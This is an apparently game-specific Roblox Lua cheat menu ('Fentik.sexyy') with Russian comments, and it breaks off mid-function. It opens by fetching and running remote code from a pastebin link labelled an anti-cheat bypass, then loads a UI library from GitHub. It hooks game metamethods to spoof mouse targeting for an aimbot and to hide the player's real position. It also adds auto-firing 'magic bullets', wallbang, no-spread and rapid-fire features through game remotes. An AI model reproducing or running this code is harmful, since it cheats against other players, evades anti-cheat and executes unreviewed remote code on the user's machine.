loadstring(game:HttpGet("https://pastebin.com/raw/gimbTwW1"))() -- ac bypass dont touch or remove
local game = game
local workspace = workspace
local a = game:GetService("Players")
local b = game:GetService("RunService")
local c = game:GetService("UserInputService")
local d = game:GetService("TweenService")
local e = game:GetService("HttpService")
local f = game:GetService("Lighting")
local g = a.LocalPlayer
local h, i = math.random, math.huge
local j, k = math.floor, math.ceil
local l, m = math.abs, math.sqrt
local n, o = math.sin, math.cos
local p, q = table.insert, table.remove
local r, s = table.sort, table.concat
local t, u = string.format, string.match
local v, w = string.lower, string.upper
local x, y = string.sub, string.gsub
local ipairs = ipairs
local type, tostring = type, tostring
local pcall, xpcall = pcall, xpcall
local loadstring = loadstring
local setmetatable = setmetatable
local getmetatable = getmetatable
local z = Color3.fromRGB
local A = UDim2.new
local B = Vector3.new
local C = CFrame.new
local isfolder = isfolder
local isfile = isfile
local listfiles = listfiles
local writefile = writefile
local readfile = readfile
local delfile = delfile
local makefolder = makefolder
local setclipboard = setclipboard
local D = game:GetService("TeleportService")
local cam = workspace.CurrentCamera
local Vector2 = Vector2
local Instance = Instance
local ColorSequence = ColorSequence
local NumberSequence = NumberSequence
local Enum = Enum
local hookmetamethod = hookmetamethod
local checkcaller = checkcaller
local newcclosure = newcclosure
local getgenv = getgenv
local task = task
local wait = wait
local fireclickdetector = fireclickdetector
local getconnections = getconnections
local debug = debug
local E = {}
local F = {}
do
    function E.new_connection(G, H)
        local I = G:Connect(H)
        p(F, I)
        return I
    end
    function E.disconnect_all()
        for J, I in ipairs(F) do
            if I then
                I:Disconnect()
            end
        end
        F = {}
    end
end

do -- Targeting Framework
    local targeting_state = {current = nil}
    pcall(function()
        _G.targeting_state = targeting_state
    end)
    
    local TargetingFramework = {}
    
    do -- Utility Functions
        local utility = {}
        
        function utility:ValidateClient(player)
            if not player then
                return false
            end
            local character = player.Character
            if not character then
                return false
            end
            local humanoid = character:FindFirstChildOfClass("Humanoid")
            if not humanoid or humanoid.Health <= 0 then
                return false
            end
            return humanoid.RootPart ~= nil
        end
        
        function utility:GetPreferredPart(character)
            return character and 
                (character:FindFirstChild("HumanoidRootPart") or 
                 character:FindFirstChild("Head") or 
                 character:FindFirstChild("UpperTorso") or
                 character:FindFirstChild("Torso")) or nil
        end
        
        function utility:ToScreen(position)
            local screenPos, onScreen = cam:WorldToViewportPoint(position)
            return Vector2.new(screenPos.X, screenPos.Y), onScreen
        end
        
        function utility:GetMouseLocation()
            return c:GetMouseLocation()
        end
        
        function utility:GetMouseDistance(screenPos)
            return (utility:GetMouseLocation() - screenPos).Magnitude
        end
        
        function utility:getHeld()
            local character = g.Character
            if not character then return "None" end
            local tool = character:FindFirstChildOfClass("Tool")
            return tool or "None"
        end
        
        function utility:GetOrigin()
            local Tool = utility:getHeld()
            return (Tool ~= "None" and Tool.Handle and Tool.Handle.Position) or cam.CFrame.Position
        end
        
        -- Force Hit utility functions
        function utility:isPlayerKO(player)
            if not player or not player.Character then return false end
            local humanoid = player.Character:FindFirstChild("Humanoid")
            return humanoid and humanoid.Health <= 0
        end
        
        function utility:isPlayerGrabbed(player)
            if not player or not player.Character then return false end
            -- Проверяем, схвачен ли игрок
            local humanoid = player.Character:FindFirstChild("Humanoid")
            if humanoid then
                return humanoid.PlatformStand or false
            end
            return false
        end
        
        function utility:hasForceField(player)
            if not player or not player.Character then return false end
            return player.Character:FindFirstChildOfClass("ForceField") ~= nil
        end
        
        function utility:performForceHit(targetPlayer)
            if not targetPlayer or not targetPlayer.Character then 
                return false 
            end
            
            local character = g.Character
            if not character then 
                return false 
            end
            
            local tool = character:FindFirstChildOfClass("Tool")
            if not tool or not tool:FindFirstChild("Handle") then 
                return false 
            end
            
            local targetHRP = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
            local targetHead = targetPlayer.Character:FindFirstChild("Head")
            if not targetHRP or not targetHead then 
                return false 
            end
            
            -- Получаем RemoteEvent оружия
            local toolRemote = tool:FindFirstChild("RemoteEvent")
            if not toolRemote then
                print("[ForceHit] Tool RemoteEvent not found")
                return false
            end
            
            -- Получаем MainRemoteEvent
            local replicatedStorage = game:GetService("ReplicatedStorage")
            local mainRemotes = replicatedStorage:FindFirstChild("MainRemotes")
            if not mainRemotes then
                print("[ForceHit] MainRemotes not found")
                return false
            end
            
            local mainRemoteEvent = mainRemotes:FindFirstChild("MainRemoteEvent")
            if not mainRemoteEvent then
                print("[ForceHit] MainRemoteEvent not found")
                return false
            end
            
            -- Выполняем последовательность выстрела как в оригинальном скрипте
            local origin = tool.Handle.Position
            print("[ForceHit] Shooting from", origin, "to", targetHRP.Position)
            print("[ForceHit] Tool:", tool.Name)
            
            -- 1. Сначала отправляем "Shoot" через RemoteEvent оружия
            local success1 = pcall(function()
                toolRemote:FireServer("Shoot")
            end)
            if not success1 then
                print("[ForceHit] Failed to send Shoot command")
            end
            
            -- 2. Отправляем основной выстрел через MainRemoteEvent
            local success2 = pcall(function()
                mainRemoteEvent:FireServer(
                    "ShootGun",
                    tool.Handle,
                    origin,
                    targetHRP.Position,
                    targetHead,
                    B(0, 0, -1) -- Vector3.zAxis как в оригинале
                )
            end)
            if not success2 then
                print("[ForceHit] Failed to send ShootGun command")
            else
                print("[ForceHit] ShootGun command sent successfully")
            end
            
            -- 3. Завершаем выстрел
            local success3 = pcall(function()
                toolRemote:FireServer()
            end)
            if not success3 then
                print("[ForceHit] Failed to send final FireServer command")
            end
            
            return success2
        end
        
        TargetingFramework.utility = utility
    end
    
    do -- Core Framework Functions
        TargetingFramework._hit_listeners = {}
        TargetingFramework._target = {info = nil, listeners = {}}
        TargetingFramework._dd = {
            last_target = nil,
            last_char = nil,
            hum = nil,
            last_health = nil,
            last_max = nil,
            conn = nil,
            hum_conn = nil,
            last_debug_t = 0,
            override_player = nil
        }
        
        function TargetingFramework:GetClosestToMouse()
            local closestPlayer, closestDistance = nil, nil
            for _, player in ipairs(a:GetPlayers()) do
                if player ~= g and self.utility:ValidateClient(player) then
                    local character = player.Character
                    local targetPart = self.utility:GetPreferredPart(character)
                    if targetPart then
                        local screenPos, onScreen = self.utility:ToScreen(targetPart.Position)
                        if onScreen then
                            local distance = self.utility:GetMouseDistance(screenPos)
                            if not closestDistance or distance < closestDistance then
                                closestPlayer, closestDistance = player, distance
                            end
                        end
                    end
                end
            end
            return closestPlayer, closestDistance or math.huge
        end
        
        function TargetingFramework:OnHit(callback)
            if typeof(callback) == "function" then
                p(self._hit_listeners, callback)
            end
        end
        
        function TargetingFramework:OnTargetUpdate(callback)
            if typeof(callback) == "function" then
                p(self._target.listeners, callback)
            end
        end
        
        function TargetingFramework:_emit_hit(targetInfo)
            for _, callback in ipairs(self._hit_listeners) do
                pcall(callback, targetInfo)
            end
        end
        
        function TargetingFramework:GetTargetInfo()
            local targetInfo = self._target.info
            return targetInfo ~= nil, targetInfo
        end
        
        function TargetingFramework:SetTargetInfo(player)
            local targetInfo = nil
            self._dd.override_player = player or nil
            
            if player and player.Character then
                local character = player.Character
                local humanoid = character:FindFirstChildOfClass("Humanoid")
                local rootPart = humanoid and humanoid.RootPart or character:FindFirstChild("HumanoidRootPart")
                local health = humanoid and humanoid.Health or nil
                local maxHealth = humanoid and humanoid.MaxHealth or nil
                local cframe = rootPart and rootPart.CFrame or (character.GetPivot and character:GetPivot() or nil)
                local position = rootPart and rootPart.Position or (cframe and cframe.Position or nil)
                
                targetInfo = {
                    isTarget = true,
                    player = player,
                    userId = player.UserId,
                    name = player.Name,
                    displayName = player.DisplayName,
                    character = character,
                    humanoid = humanoid,
                    root = rootPart,
                    cframe = cframe,
                    position = position,
                    health = health,
                    maxHealth = maxHealth,
                    alive = humanoid and humanoid.Health > 0,
                    time = os.clock()
                }
            end
            
            self._target.info = targetInfo
            for _, callback in ipairs(self._target.listeners) do
                pcall(callback, targetInfo)
            end
        end
        
        function TargetingFramework:ClearTargetInfo()
            self._target.info = nil
            self._dd.override_player = nil
            for _, callback in ipairs(self._target.listeners) do
                pcall(callback, nil)
            end
        end
        
        function TargetingFramework:SetCurrentTarget(player)
            self._dd.override_player = player
        end
        
        function TargetingFramework:ClearCurrentTarget()
            self._dd.override_player = nil
        end
        
        function TargetingFramework:GetCurrentTarget()
            return self._dd.override_player or (targeting_state and targeting_state.current or nil)
        end
    end
    
    do -- Target Selection Logic
        local TargetSelector = {}
        
        function TargetSelector:selectTarget()
            if targeting_state.current then
                targeting_state.current = nil
                TargetingFramework:ClearTargetInfo()
                TargetingFramework:ClearCurrentTarget()
            else
                local closestTarget, _distance = TargetingFramework:GetClosestToMouse()
                if closestTarget then
                    targeting_state.current = closestTarget
                    TargetingFramework:SetTargetInfo(closestTarget)
                    TargetingFramework:SetCurrentTarget(closestTarget)
                end
            end
        end
        
        TargetingFramework.selector = TargetSelector
    end
    
    do -- Health Detection System
        local function StartHealthDetection()
            if TargetingFramework._dd.conn then
                TargetingFramework._dd.conn:Disconnect()
                TargetingFramework._dd.conn = nil
            end
            
            TargetingFramework._dd.conn = b.Heartbeat:Connect(function()
                -- Проверяем включен ли таргетинг
                if not K or not K.Flags or not K.Flags["TargetingEnabled"] then
                    return
                end
                
                local dd = TargetingFramework._dd
                local currentTarget = dd.override_player or (targeting_state and targeting_state.current or nil)
                
                if currentTarget ~= dd.last_target then
                    dd.last_target = currentTarget
                    dd.last_char = nil
                    dd.hum = nil
                    dd.last_health = nil
                    dd.last_max = nil
                    
                    if dd.hum_conn then
                        pcall(function()
                            dd.hum_conn:Disconnect()
                        end)
                        dd.hum_conn = nil
                    end
                end
                
                if not currentTarget then
                    return
                end
                
                local character = currentTarget.Character
                if character ~= dd.last_char or (dd.hum and not dd.hum.Parent) then
                    dd.last_char = character
                    dd.hum = character and character:FindFirstChildOfClass("Humanoid") or nil
                    dd.last_health = nil
                    dd.last_max = nil
                    
                    if dd.hum_conn then
                        pcall(function()
                            dd.hum_conn:Disconnect()
                        end)
                        dd.hum_conn = nil
                    end
                    
                    if dd.hum then
                        b.Heartbeat:Wait()
                        dd.hum_conn = dd.hum.HealthChanged:Connect(function(newHealth)
                            local maxHealth = dd.hum and dd.hum.MaxHealth or 0
                            if dd.last_health == nil or dd.last_max == nil or maxHealth ~= dd.last_max then
                                dd.last_health = newHealth
                                dd.last_max = maxHealth
                                return
                            end
                            
                            if newHealth < dd.last_health then
                                local damage = dd.last_health - newHealth
                                print("[DamageDetection] Damage detected:", damage, "to", currentTarget.Name)
                                TargetingFramework:_emit_hit({
                                    player = currentTarget,
                                    damage = damage,
                                    health = newHealth,
                                    maxHealth = maxHealth,
                                    time = os.clock()
                                })
                            end
                            
                            dd.last_health = newHealth
                            dd.last_max = maxHealth
                        end)
                    end
                end
            end)
        end
        
        -- Функция остановки
        function TargetingFramework:StopHealthDetection()
            if self._dd.conn then
                self._dd.conn:Disconnect()
                self._dd.conn = nil
            end
            if self._dd.hum_conn then
                self._dd.hum_conn:Disconnect()
                self._dd.hum_conn = nil
            end
        end
        
        -- Запускаем только если нужно
        TargetingFramework.StartHealthDetection = StartHealthDetection
        
        -- Добавляем метод для проверки статуса
        function TargetingFramework:IsHealthDetectionActive()
            return self._dd.conn ~= nil
        end
    end
    
    _G.TargetingFramework = TargetingFramework
end

do -- Desync Framework
    local desync_vars = {
        Players = a,
        RunService = b,
        StarterGui = game:GetService("StarterGui"),
        newcf = C,
        v3 = B,
        typeof = typeof,
        task = task,
        math = math,
        cam = cam,
        uis = c
    }

    local config = {
        Desync = {
            Enabled = false,
            LogInterval = 2
        }
    }

    local state = {
        enabled = false,
        targetCFrame = nil,
        realCFrame = nil,
        hookInstalled = false,
        logStarted = false,
        followMode = false,
        viz_enabled = false,
        viz_part = nil,
        viz_line = nil,
        viz_conn = nil,
        heartbeatConn = nil
    }

    local desync_utility = {}

    function desync_utility:ValidateClient(player)
        if not player then
            return false
        end
        local character = player.Character
        if not character then
            return false
        end
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        if not humanoid or humanoid.Health <= 0 then
            return false
        end
        local rootPart = humanoid.RootPart
        return rootPart ~= nil
    end

    function desync_utility:getPlayerParts(player)
        local character = player and player.Character
        local humanoid = character and character:FindFirstChildOfClass("Humanoid")
        local rootPart = humanoid and humanoid.RootPart
        return character, humanoid, rootPart
    end

    local function parseCFrame(arg1, arg2, arg3)
        local argType = desync_vars.typeof(arg1)
        if argType == "CFrame" then
            return arg1
        end
        if argType == "Vector3" then
            return desync_vars.newcf(arg1)
        end
        if argType == "table" and arg1[1] and arg1[2] and arg1[3] then
            return desync_vars.newcf(arg1[1], arg1[2], arg1[3])
        end
        if argType == "number" and type(arg2) == "number" and type(arg3) == "number" then
            return desync_vars.newcf(arg1, arg2, arg3)
        end
        return nil
    end

    local function installHook()
        if state.hookInstalled then
            return
        end
        if not hookmetamethod or not newcclosure or not checkcaller then
            state.hookInstalled = true
            return
        end
        local oldIndex
        oldIndex = hookmetamethod(game, "__index", newcclosure(function(self, key)
            if not checkcaller() then
                if key == "CFrame" and state.enabled then
                    local _, _, rootPart = desync_utility:getPlayerParts(g)
                    if rootPart and self == rootPart and state.realCFrame then
                        return state.realCFrame
                    end
                end
            end
            return oldIndex(self, key)
        end))
        state.hookInstalled = true
    end

    local function startDesyncLoop()
        if state.heartbeatConn then
            return
        end
        state.heartbeatConn = desync_vars.RunService.Heartbeat:Connect(function()
            -- Проверяем флаги и отключаем цикл если не нужен
            if not config.Desync.Enabled or not state.enabled then
                if state.heartbeatConn then
                    state.heartbeatConn:Disconnect()
                    state.heartbeatConn = nil
                end
                return
            end
            if not desync_utility:ValidateClient(g) then
                return
            end
            local _, _, rootPart = desync_utility:getPlayerParts(g)
            if not rootPart then
                return
            end
            state.realCFrame = rootPart.CFrame
            local targetCF
            if state.followMode then
                targetCF = rootPart.CFrame
            else
                targetCF = state.targetCFrame or state.realCFrame
            end
            rootPart.CFrame = targetCF
            desync_vars.RunService.RenderStepped:Wait()
            rootPart.CFrame = state.realCFrame
        end)
    end

    local DesyncLibrary = {}
    

    function DesyncLibrary.movedesyncto(arg1, arg2, arg3)
        local targetCF = parseCFrame(arg1, arg2, arg3)
        if not targetCF then
            error("movedesyncto: invalid coordinates")
        end
        state.targetCFrame = targetCF
        state.followMode = false
        config.Desync.Enabled = true
        state.enabled = true
        installHook()
        startDesyncLoop()
        return targetCF
    end

    function DesyncLibrary.checksyncposition()
        local position
        if state.targetCFrame then
            position = state.targetCFrame.Position
        else
            local _, _, rootPart = desync_utility:getPlayerParts(g)
            position = rootPart and rootPart.Position or nil
        end
        return position
    end

    function DesyncLibrary.SynchronizeSyncWithPlayer()
        -- Безопасная проверка без ошибки
        if not desync_utility:ValidateClient(g) then
            return nil -- Просто возвращаем nil вместо ошибки
        end
        state.targetCFrame = nil
        state.followMode = true
        config.Desync.Enabled = true
        state.enabled = true
        installHook()
        startDesyncLoop()
        local _, _, rootPart = desync_utility:getPlayerParts(g)
        return rootPart and rootPart.CFrame or nil
    end

    function DesyncLibrary.StopDesync()
        config.Desync.Enabled = false
        state.enabled = false
        state.targetCFrame = nil
        state.followMode = false
        
        if state.heartbeatConn then
            pcall(function()
                state.heartbeatConn:Disconnect()
            end)
            state.heartbeatConn = nil
        end
    end

    function DesyncLibrary.IsEnabled()
        return state.enabled
    end
    

    pcall(function()
        getgenv().DesyncLibrary = DesyncLibrary
    end)
    _G.DesyncLibrary = DesyncLibrary
end

local K =
    loadstring(game:HttpGet("https://raw.githubusercontent.com/OnChangedCallback/fent.lua/refs/heads/main/library"))()
local L =
    K:Window(
    {
        Name = "Fentik.sexyy",
        Size = UDim2.new(0, 700, 0, 670),
        GradientTitle = {
            Enabled = false,
            Start = Color3.fromRGB(255, 255, 255),
            Middle = Color3.fromRGB(255, 255, 255),
            End = Color3.fromRGB(255, 255, 255),
            Speed = 0.1
        }
    }
)
local M = L:Page({Name = "Ragebot", Columns = 2})
-- Неиспользуемые вкладки (закомментированы для оптимизации)
-- local N = L:Page({Name = "Visuals", Columns = 2})
-- local O = L:Page({Name = "Misc", Columns = 2})
-- local P = L:Page({Name = "AntiAim", Columns = 2})

do -- Ragebot Tab
    do -- Targeting Section
        local aP = M:Section({Name = "Targeting", Side = 1})
    local aQ = aP:Toggle({
        Name = "Targeting",
        Default = false,
        Flag = "TargetingEnabled",
        Callback = function(aR)
            if _G.TargetingFramework then
                if aR then
                    -- Включаем health detection при включении таргетинга
                    if _G.TargetingFramework.StartHealthDetection then
                        _G.TargetingFramework.StartHealthDetection()
                        print("[Targeting] Health detection started")
                    end
                else
                    -- Выключаем health detection и очищаем таргет
                    _G.TargetingFramework:StopHealthDetection()
                    _G.TargetingFramework:ClearTargetInfo()
                    _G.TargetingFramework:ClearCurrentTarget()
                    print("[Targeting] Health detection stopped")
                    if _G.targeting_state then
                        _G.targeting_state.current = nil
                    end
                end
            end
        end
    })
    
        local aS = aQ:Keybind({
            Name = "Target Selection",
            Mode = "Toggle",
            Default = Enum.KeyCode.T,
            Flag = "TargetSelectionKey",
            Callback = function(aT)
                if K.Flags["TargetingEnabled"] and _G.TargetingFramework and _G.TargetingFramework.selector then
                    _G.TargetingFramework.selector:selectTarget()
                end
            end
        })
    end
    
    
    do -- Aimbot Section
        local aY = M:Section({Name = "Aimbot", Side = 1})
    local aZ = aY:Toggle({
        Name = "Enabled",
        Default = false,
        Flag = "AimbotEnabled",
        Callback = function(ba)
            -- Callback обрабатывается через aimbot logic
        end
    })
    
    local bb = aY:Textbox({
        Name = "XZ Prediction",
        Default = "0.048",
        Placeholder = "0.048",
        Flag = "AimbotXZPrediction",
        Callback = function(bc)
            -- Значение автоматически обновляется через K.Flags
        end
    })
    
    local bd = aY:Textbox({
        Name = "Y Prediction", 
        Default = "0.048",
        Placeholder = "0.048",
        Flag = "AimbotYPrediction",
        Callback = function(be)
            -- Значение автоматически обновляется через K.Flags
        end
    })
    
    local bf = aY:Toggle({
        Name = "ShowAimbot",
        Default = false,
        Flag = "ShowAimbot",
        Callback = function(bg)
            -- Управляем beam visualization
            if _G.BeamVisualization then
                if bg then
                    if _G.BeamVisualization.StartBeamVisualization then
                        _G.BeamVisualization.StartBeamVisualization()
                    end
                else
                    if _G.BeamVisualization.StopBeamVisualization then
                        _G.BeamVisualization.StopBeamVisualization()
                    end
                end
            end
        end
    })
    
        local bh = aY:Dropdown({
            Name = "Resolver Type",
            Items = {"Velocity", "MoveDirection", "CalculateCFrame"},
            Default = "Velocity",
            Flag = "ResolverType",
            Callback = function(bi)
                -- Callback обрабатывается через resolver logic
            end
        })
    end
    
    do -- Gun Section
        local gunSection = M:Section({Name = "Gun", Side = 1})
        
        local _rapidFireToggle = gunSection:Toggle({
            Name = "Rapid Fire",
            Default = false,
            Flag = "RapidFireEnabled",
            Callback = function(enabled)
                if _G.RapidFireFramework then
                    _G.RapidFireFramework.setEnabled(enabled)
                end
            end
        })
        
        local _infinityAmmoToggle = gunSection:Toggle({
            Name = "Infinity Ammo (maypatched)",
            Default = false,
            Flag = "InfinityAmmoEnabled",
            Callback = function(enabled)
                if _G.InfinityAmmoFramework then
                    _G.InfinityAmmoFramework.setEnabled(enabled)
                end
            end
        })
        
        local _infinityRangeToggle = gunSection:Toggle({
            Name = "Infinity Range",
            Default = false,
            Flag = "InfinityRangeEnabled",
            Callback = function(enabled)
                if _G.InfinityRangeFramework then
                    _G.InfinityRangeFramework.setEnabled(enabled)
                end
            end
        })
    end
    
    do -- Notify Section
        local aT = M:Section({Name = "Notify", Side = 2})
    local aU = aT:Toggle({
        Name = "OnSelected",
        Default = false,
        Flag = "NotifyOnSelected",
        Callback = function(aV)
            -- Callback будет обработан через targeting framework
        end
    })
    
        local aW = aT:Toggle({
            Name = "OnDamage", 
            Default = false,
            Flag = "NotifyOnDamage",
            Callback = function(aX)
                -- Callback будет обработан через targeting framework
            end
        })
    end
    
    do -- Exploits Section
        local exploitsSection = M:Section({Name = "Exploits", Side = 2})
        
        local _forceHitToggle = exploitsSection:Toggle({
            Name = "Magic Bullets",
            Default = false,
            Flag = "ForceHitEnabled",
            Callback = function(enabled)
                if _G.ForceHitFramework then
                    if enabled then
                        _G.ForceHitFramework.start()
                    else
                        _G.ForceHitFramework.stop()
                    end
                end
            end
        })
        
        local _wallbangToggle = exploitsSection:Toggle({
            Name = "Wallbang",
            Default = false,
            Flag = "WallbangEnabled",
            Callback = function(enabled)
                if _G.WallbangFramework then
                    if enabled then
                        _G.WallbangFramework.start()
                    else
                        _G.WallbangFramework.stop()
                    end
                end
            end
        })
        
        local _noSpreadToggle = exploitsSection:Toggle({
            Name = "NoSpread",
            Default = false,
            Flag = "NoSpreadEnabled",
            Callback = function(enabled)
                if _G.NoSpreadFramework then
                    if enabled then
                        _G.NoSpreadFramework.start()
                    else
                        _G.NoSpreadFramework.stop()
                    end
                end
            end
        })
    end
    
    do -- Desync Section
        local desyncSection = M:Section({Name = "Desync", Side = 2})
        local _autoArmorToggle = desyncSection:Toggle({
            Name = "AutoArmor",
            Default = false,
            Flag = "AutoArmorEnabled",
            Callback = function(enabled)
                if _G.AutoArmorFramework then
                    if enabled then
                        _G.AutoArmorFramework.start()
                    else
                        _G.AutoArmorFramework.stop()
                        -- Синхронизируемся при выключении
                        if getgenv().DesyncLibrary then
                            pcall(function()
                                getgenv().DesyncLibrary.SynchronizeSyncWithPlayer()
                            end)
                        end
                    end
                end
            end
        })
        
        local _autoStompToggle = desyncSection:Toggle({
            Name = "Auto Stomp",
            Default = false,
            Flag = "AutoStompEnabled",
            Callback = function(enabled)
                if _G.AutoStompFramework then
                    if enabled then
                        _G.AutoStompFramework.start()
                    else
                        _G.AutoStompFramework.stop()
                    end
                end
            end
        })
        
        desyncSection:Toggle({
            Name = "Hide",
            Default = false,
            Flag = "HideEnabled",
            Callback = function(enabled)
                if _G.HideFramework then
                    if enabled then
                        _G.HideFramework.start()
                    else
                        _G.HideFramework.stop()
                    end
                end
            end
        })
    end
    
    do -- Notification Integration
        if _G.TargetingFramework then
            _G.TargetingFramework:OnTargetUpdate(function(targetInfo)
                if K.Flags["NotifyOnSelected"] then
                    if targetInfo then
                        K:Notification("Target selected: " .. targetInfo.name, 2, z(0, 255, 0))
                    else
                        K:Notification("Target cleared", 2, z(255, 255, 0))
                    end
                end
            end)
            
            _G.TargetingFramework:OnHit(function(hitInfo)
                print("[DamageNotification] Hit event received:", hitInfo and hitInfo.damage or "nil")
                if K.Flags["NotifyOnDamage"] and hitInfo then
                    local damageText = t("%.1f damage to %s", hitInfo.damage, hitInfo.player.Name)
                    print("[DamageNotification] Showing notification:", damageText)
                    K:Notification(damageText, 2, z(255, 100, 100))
                else
                    print("[DamageNotification] Flag disabled or no hitInfo")
                end
            end)
        end
    end
    
    do -- Aimbot Framework
        local AimbotFramework = {}
        local LastPosition = nil
        local LastUpdateTime = nil
        
        local function GetPredictedPosition(targetPlayer)
            if not targetPlayer or not targetPlayer.Character or not targetPlayer.Character:FindFirstChild("Humanoid") then 
                return nil 
            end
            
            local targetPart = targetPlayer.Character:FindFirstChild("HumanoidRootPart") or targetPlayer.Character:FindFirstChild("Head")
            if not targetPart then 
                return nil
            end
            
            if not LastPosition or not LastUpdateTime then
                LastPosition = targetPart.Position
                LastUpdateTime = os.clock()
                return LastPosition
            end
            
            local resolverType = K.Flags["ResolverType"] or "Velocity"
            local xzPrediction = tonumber(K.Flags["AimbotXZPrediction"]) or 0.048
            local yPrediction = tonumber(K.Flags["AimbotYPrediction"]) or 0.048
            
            if resolverType == "Velocity" then
                return targetPart.Position + B(
                    targetPart.Velocity.X * xzPrediction,
                    targetPart.Velocity.Y * yPrediction,
                    targetPart.Velocity.Z * xzPrediction
                )
            elseif resolverType == "MoveDirection" then
                return targetPart.Position + (targetPlayer.Character.Humanoid.MoveDirection * (xzPrediction * 10))
            elseif resolverType == "CalculateCFrame" then
                if (targetPart.Position - LastPosition).Magnitude < 0.001 then
                    return targetPart.Position
                else
                    local currentTime = os.clock()
                    local deltaTime = currentTime - LastUpdateTime
                    local deltaPosition = targetPart.Position - LastPosition
                    LastUpdateTime, LastPosition = currentTime, targetPart.Position
                    
                    if deltaTime > 0 and deltaPosition.Magnitude > 0.001 then
                        local velocity = deltaPosition / deltaTime
                        return targetPart.Position + velocity * (0.1 * xzPrediction)
                    else
                        return targetPart.Position
                    end
                end
            end
            
            return targetPart.Position
        end
        
        local function CheckAimbot()
            return K.Flags["AimbotEnabled"] and K.Flags["TargetingEnabled"] and _G.targeting_state and _G.targeting_state.current
        end
        
        local originalIndex
        originalIndex = hookmetamethod(game, "__index", function(t, k)
            if t:IsA("Mouse") and (k == "Hit" or k == "Target") and not checkcaller() then
                if CheckAimbot() and _G.targeting_state.current then
                    local targetPlayer = _G.targeting_state.current
                    local targetPart = targetPlayer.Character and (targetPlayer.Character:FindFirstChild("HumanoidRootPart") or targetPlayer.Character:FindFirstChild("Head"))
                    
                    if targetPart then
                        local predictedPos = GetPredictedPosition(targetPlayer) or targetPart.Position
                        local hit = C(predictedPos)
                        return k == "Hit" and hit or targetPart
                    end
                end
            end
            return originalIndex(t, k)
        end)
        
        _G.AimbotFramework = AimbotFramework
    end
    
    do -- Force Hit Framework
        local ForceHitFramework = {
            enabled = false,
            connection = nil,
            shootDelay = 0.1, -- Задержка между выстрелами
            lastShotTime = 0
        }
        
        function ForceHitFramework.start()
            if ForceHitFramework.connection then
                return
            end
            
            ForceHitFramework.enabled = true
            print("[ForceHit] Framework started")
            
            ForceHitFramework.connection = E.new_connection(b.Heartbeat, function()
                if not ForceHitFramework.enabled then
                    return
                end
                
                -- Проверяем, есть ли текущая цель
                if not _G.targeting_state or not _G.targeting_state.current then
                    return
                end
                
                local currentTarget = _G.targeting_state.current
                if not currentTarget or not currentTarget.Character then
                    return
                end
                
                -- Проверяем задержку между выстрелами
                local now = os.clock()
                if now - ForceHitFramework.lastShotTime < ForceHitFramework.shootDelay then
                    return
                end
                
                -- Проверяем, есть ли у нас оружие
                local character = g.Character
                if not character then
                    return
                end
                
                local tool = character:FindFirstChildOfClass("Tool")
                if not tool or not tool:FindFirstChild("Handle") then
                    return
                end
                
                -- Проверяем состояние цели
                local utility = _G.TargetingFramework and _G.TargetingFramework.utility
                if not utility then
                    return
                end
                
                local isKO = utility:isPlayerKO(currentTarget)
                local _isGrabbed = utility:isPlayerGrabbed(currentTarget)
                local hasFF = utility:hasForceField(currentTarget)
                
                -- Если цель в невалидном состоянии, пропускаем
                if isKO or hasFF then
                    return
                end
                
                -- Проверяем дистанцию
                local targetHRP = currentTarget.Character:FindFirstChild("HumanoidRootPart")
                if not targetHRP then
                    return
                end
                
                local myHRP = character:FindFirstChild("HumanoidRootPart")
                if not myHRP then
                    return
                end
                
                local distance = (myHRP.Position - targetHRP.Position).Magnitude
                local maxRange = 5000 -- Максимальная дистанция для Force Hit
                
                if distance > maxRange then
                    return
                end
                
                -- Выполняем Force Hit
                local success = utility.performForceHit(utility, currentTarget)
                if success then
                    ForceHitFramework.lastShotTime = now
                    print("[ForceHit] Shot fired at", currentTarget.Name)
                end
            end)
        end
        
        function ForceHitFramework.stop()
            ForceHitFramework.enabled = false
            if ForceHitFramework.connection then
                ForceHitFramework.connection:Disconnect()
                ForceHitFramework.connection = nil
            end
            print("[ForceHit] Framework stopped")
        end
        
        _G.ForceHitFramework = ForceHitFramework
    end
    
    do -- Wallbang Framework
        local WallbangFramework = {
            enabled = false,
            originalIgnored = nil,
            mainModule = nil
        }
        
        function WallbangFramework.start()
            if WallbangFramework.enabled then
                return
            end
            
            -- Получаем MainModule
            local replicatedStorage = game:GetService("ReplicatedStorage")
            local handler = replicatedStorage:FindFirstChild("MainModule")
            if not handler then
                print("[Wallbang] MainModule not found")
                return
            end
            
            local success, module = pcall(function()
                return require(handler)
            end)
            
            if not success or not module then
                print("[Wallbang] Failed to require MainModule")
                return
            end
            
            WallbangFramework.mainModule = module
            
            -- Сохраняем оригинальные значения
            if module.Ignored then
                WallbangFramework.originalIgnored = {}
                for i, v in ipairs(module.Ignored) do
                    WallbangFramework.originalIgnored[i] = v
                end
                print("[Wallbang] Original Ignored saved:", #WallbangFramework.originalIgnored, "items")
            else
                WallbangFramework.originalIgnored = nil
                print("[Wallbang] No original Ignored found")
            end
            
            -- Устанавливаем новые значения для Wallbang
            pcall(function()
                module.Ignored = {
                    workspace:WaitForChild("Vehicles"), 
                    workspace:WaitForChild("MAP"), 
                    workspace:WaitForChild("Ignored")
                }
            end)
            
            WallbangFramework.enabled = true
            print("[Wallbang] Framework started - walls will be ignored")
        end
        
        function WallbangFramework.stop()
            if not WallbangFramework.enabled then
                return
            end
            
            -- Восстанавливаем оригинальные значения
            if WallbangFramework.mainModule and WallbangFramework.originalIgnored then
                pcall(function()
                    WallbangFramework.mainModule.Ignored = {}
                    for i, v in ipairs(WallbangFramework.originalIgnored) do
                        WallbangFramework.mainModule.Ignored[i] = v
                    end
                end)
                print("[Wallbang] Original Ignored restored:", #WallbangFramework.originalIgnored, "items")
            elseif WallbangFramework.mainModule then
                -- Если оригинальных значений не было, очищаем
                pcall(function()
                    WallbangFramework.mainModule.Ignored = {}
                end)
                print("[Wallbang] Ignored cleared (no original values)")
            end
            
            WallbangFramework.enabled = false
            WallbangFramework.originalIgnored = nil
            WallbangFramework.mainModule = nil
            print("[Wallbang] Framework stopped - walls restored")
        end
        
        _G.WallbangFramework = WallbangFramework
    end
    
    do -- NoSpread Framework
        local NoSpreadFramework = {
            enabled = false,
            originalMathRandom = nil,
            hookedFunction = nil
        }
        
        function NoSpreadFramework.start()
            if NoSpreadFramework.enabled then
                return
            end
            
            -- Создаем хук для math.random
            local old
            old = hookfunction(math.random, function(...)
                local args = {...}
                
                -- Проверяем, вызывается ли из нашего кода
                if checkcaller() then
                    return old(...)
                end
                
